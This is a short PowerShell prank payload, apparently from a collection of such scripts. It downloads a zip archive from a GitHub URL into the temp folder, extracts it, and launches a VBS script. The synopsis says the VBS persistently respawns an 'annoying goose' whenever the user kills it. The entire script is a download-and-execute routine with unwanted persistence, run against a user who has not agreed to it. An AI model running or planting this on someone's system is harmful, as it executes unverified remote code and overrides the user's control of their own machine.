<# ================== Persisant Goose Prank =======================
SYNOPSIS
Spawn an annoying goose and replace it if it's killed by the user.
Downloads a goose zip file and extracts contents to the temp folder then starts a vbs script that spawns goose 30 secs after its killed.
#>

$url = "https://github.com/beigeworm/assets/raw/main/Goose.zip"
$tempFolder = $env:TMP
$zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
$extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
Invoke-WebRequest -Uri $url -OutFile $zipFile
Expand-Archive -Path $zipFile -DestinationPath $extractPath
$vbscript = "$extractPath\Goose.vbs"
& $vbscript
